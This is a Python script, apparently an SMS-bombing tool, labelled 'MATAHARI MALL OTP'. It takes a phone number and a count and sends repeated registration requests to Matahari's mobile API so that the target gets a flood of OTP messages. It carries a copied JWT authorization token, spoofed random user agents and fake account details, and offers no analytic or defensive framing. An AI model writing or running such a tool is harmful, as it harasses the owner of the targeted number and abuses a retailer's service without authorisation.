import requests,time
from fake_useragent import UserAgent
ua = UserAgent()

print("""
	    [ MATAHARI MALL OTP ]
	   
""")

no = input('Number: ')
jml = int(input('Jumlah: '))

heder = {'Host': 'thor.matahari.com',
           'content-length': '230',
           'modulecode': 'MR',
           'origin': 'https://www.matahari.com',
           'authorization': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJtb2R1bGVDb2RlIjoiTVIiLCJ1c2VyVHlwZSI6IjEiLCJleHAiOjE1NDM2NjA5MDYsInVzZXJOYW1lIjoiS0Zpb2ViMWhveU9FRDBERWQiLCJ1c2VySWQiOiJwcm9kdWN0aW9uNDYxOTAyNjQ0NSIsImp0aSI6IjFmMjI3NzE5LTY4OTMtNDhjYy1iNmQzLWY2OTkzMWMzMDIwYSIsImlhdCI6MTU0MzY1NzMwNn0.6XdrUX9QzD0Ld2eOJep7QnSwVjfFyjq-v7P4w0lGG9M',
           'content-type': 'application/json',
           'accept': 'application/json, text/plain, */*',
           'clientid': 'mds_mweb',
           'user-agent': ua.random,
           'sessionid': '1595084426451',
           'save-data': 'on',
           'referer': 'https://www.matahari.com/register',
           'accept-encoding': 'gzip, deflate, br',
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6'}

data = {'emailAddress': 'noobie@mail.com',
           'firstName': 'NUGELO ANYAR',
           'lastName': 'Gans',
           'mobileNumber': no,
           'mccCardNumber': '',
           'password': 'asecc123',
           'referralCode': '',
           'dateOfBirth': '09-05-1991',
           'gender': 'Male',
           'registrationType': 'N'}

print("\n[RESULT]")
for i in range(jml):
      sec = requests.post('https://thor.matahari.com/MatahariMobileAPI/register', headers=heder, json=data)
      if 'eror' in sec.text:
           print(f'{i+1}. Gagal {no}')
      else:
           print(f'{i+1}. Berhasil {no}')
      time.sleep(1.5)